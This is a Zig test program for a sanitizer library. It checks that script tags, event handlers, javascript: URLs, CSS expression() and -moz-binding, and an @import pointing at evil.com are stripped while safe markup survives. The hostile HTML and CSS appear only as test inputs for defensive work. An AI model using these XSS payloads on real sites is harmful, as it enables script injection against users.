const std = @import("std");
const builtin = @import("builtin");
const z = @import("zexplorer");
const ScriptEngine = z.ScriptEngine;

pub fn main() !void {
    var debug_allocator: std.heap.DebugAllocator(.{}) = .init;
    const gpa, const is_debug = gpa: {
        break :gpa switch (builtin.mode) {
            .Debug, .ReleaseSafe => .{ debug_allocator.allocator(), true },
            .ReleaseFast, .ReleaseSmall => .{ std.heap.c_allocator, false },
        };
    };
    defer if (is_debug) {
        _ = debug_allocator.deinit();
    };

    z.print("\n" ++ "=" ** 70 ++ "\n", .{});
    z.print("  SANITIZER API TEST\n", .{});
    z.print("=" ** 70 ++ "\n\n", .{});

    // Test 1: Zig API - Direct Sanitizer usage
    z.print("━━━ TEST 1: Zig Sanitizer API ━━━\n\n", .{});
    try testZigSanitizerAPI(gpa);

    // Test 2: External CSS sanitization
    z.print("\n━━━ TEST 2: External CSS Sanitization ━━━\n\n", .{});
    try testExternalCSS(gpa);

    // Test 3: JavaScript API via ScriptEngine
    z.print("\n━━━ TEST 3: JavaScript API (document.parseHTMLSafe) ━━━\n\n", .{});
    const sandbox_root = try std.fs.cwd().realpathAlloc(gpa, ".");
    defer gpa.free(sandbox_root);
    try testJavaScriptAPI(gpa, sandbox_root);

    z.print("\n" ++ "=" ** 70 ++ "\n", .{});
    z.print("  ALL TESTS COMPLETE\n", .{});
    z.print("=" ** 70 ++ "\n", .{});
}

/// Direct Zig Sanitizer API
fn testZigSanitizerAPI(allocator: std.mem.Allocator) !void {
    const dirty_html =
        \\<html>
        \\<head>
        \\  <style>
        \\    .safe { color: green; }
        \\    .dangerous { behavior: url(evil.htc); -moz-binding: url(xss.xml); }
        \\  </style>
        \\</head>
        \\<body>
        \\  <script>alert('XSS')</script>
        \\  <div onclick="steal()" class="safe" style="expression(alert(1)); border: 1px solid blue">
        \\    User content
        \\  </div>
        \\  <img src="javascript:attack()" onerror="evil()">
        \\</body>
        \\</html>
    ;

    z.print("  Input HTML has:\n", .{});
    z.print("    - <script> tag\n", .{});
    z.print("    - onclick handler\n", .{});
    z.print("    - javascript: URL\n", .{});
    z.print("    - expression() in inline style\n", .{});
    z.print("    - behavior/moz-binding in <style>\n\n", .{});

    // Use new Sanitizer API
    var zan = try z.Sanitizer.init(allocator, .{});
    defer zan.deinit();

    const doc = try zan.parseHTML(dirty_html);
    defer z.destroyDocument(doc);

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    z.print("  After sanitization:\n", .{});
    z.print("    - <script> removed: {}\n", .{std.mem.indexOf(u8, result, "<script>") == null});
    z.print("    - onclick removed: {}\n", .{std.mem.indexOf(u8, result, "onclick") == null});
    z.print("    - javascript: removed: {}\n", .{std.mem.indexOf(u8, result, "javascript:") == null});
    z.print("    - Safe content preserved: {}\n", .{std.mem.indexOf(u8, result, "User content") != null});

    // Check computed styles work
    if (try z.querySelector(allocator, doc, ".safe")) |el| {
        const color = try z.getComputedStyle(allocator, el, "color");
        defer if (color) |c| allocator.free(c);
        z.print("    - CSS engine works, .safe color: {s}\n", .{color orelse "(none)"});
    }
}

/// External CSS sanitization
fn testExternalCSS(allocator: std.mem.Allocator) !void {
    const dangerous_css =
        \\@import url("https://evil.com/inject.css");
        \\.header { color: navy; font-size: 18px; }
        \\.exploit { -moz-binding: url("http://evil.com/xss.xml#xss"); }
        \\.backdoor { background: url(javascript:alert("xss")); }
        \\p { padding: 20px; margin: 10px; }
    ;

    z.print("  External CSS has:\n", .{});
    z.print("    - @import rule\n", .{});
    z.print("    - -moz-binding\n", .{});
    z.print("    - javascript: URL\n\n", .{});

    var zan = try z.Sanitizer.init(allocator, .{});
    defer zan.deinit();

    const clean_css = try zan.sanitizeStylesheet(dangerous_css);
    defer allocator.free(clean_css);

    z.print("  After sanitization:\n", .{});
    z.print("    - @import removed: {}\n", .{std.mem.indexOf(u8, clean_css, "@import") == null});
    z.print("    - -moz-binding removed: {}\n", .{std.mem.indexOf(u8, clean_css, "-moz-binding") == null});
    z.print("    - javascript: removed: {}\n", .{std.mem.indexOf(u8, clean_css, "javascript:") == null});
    z.print("    - Safe rules preserved: {}\n", .{std.mem.indexOf(u8, clean_css, "color: navy") != null});
    z.print("    - padding preserved: {}\n", .{std.mem.indexOf(u8, clean_css, "padding") != null});
}

/// JavaScript API via ScriptEngine
fn testJavaScriptAPI(allocator: std.mem.Allocator, sandbox_root: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sandbox_root);
    defer engine.deinit();

    const SanitizationResult = struct {
        scriptRemoved: bool,
        onclickRemoved: bool,
        safePreserved: bool,
        // Optional because JS might return null or undefined
        resultPreview: ?[]const u8,
    };

    // Load a simple HTML to get the document object
    try engine.loadHTML("<html><body></body></html>");

    // Test document.parseHTMLSafe from JavaScript
    const js_code =
        \\(function() {
        \\  const dirtyHTML = '<div onclick="evil()"><script>alert(1)</script><p>Safe</p></div>';
        \\
        \\  // Parse with safe defaults
        \\  const doc = document.parseHTMLSafe(dirtyHTML);
        \\  const result = doc.body.innerHTML;
        \\
        \\  // Check sanitization worked
        \\  const hasScript = result.includes('<script>');
        \\  const hasOnclick = result.includes('onclick');
        \\  const hasSafe = result.includes('Safe');
        \\
        \\  return {
        \\    scriptRemoved: !hasScript,
        \\    onclickRemoved: !hasOnclick,
        \\    safePreserved: hasSafe,
        \\    resultPreview: result.substring(0, 100)
        \\  };
        \\})()
    ;

    const result_struct = try engine.evalAs(SanitizationResult, js_code, "<js>");

    std.debug.print("Sanitization Report:\n", .{});
    std.debug.print("  - Script Removed: {}\n", .{result_struct.scriptRemoved});
    std.debug.print("  - OnClick Removed: {}\n", .{result_struct.onclickRemoved});
    if (result_struct.resultPreview) |s| {
        std.debug.print("  - Preview: {s}\n", .{s});
        allocator.free(s); // jsToZig uses allocator.dupe for strings
    }

    // const result = engine.ctx.toZString(js_result) catch {
    //     z.print("  Failed to convert result to string\n", .{});
    //     return;
    // };
    // defer engine.ctx.freeZString(result);

    // z.print("  JavaScript test result: {s}\n", .{result});
}
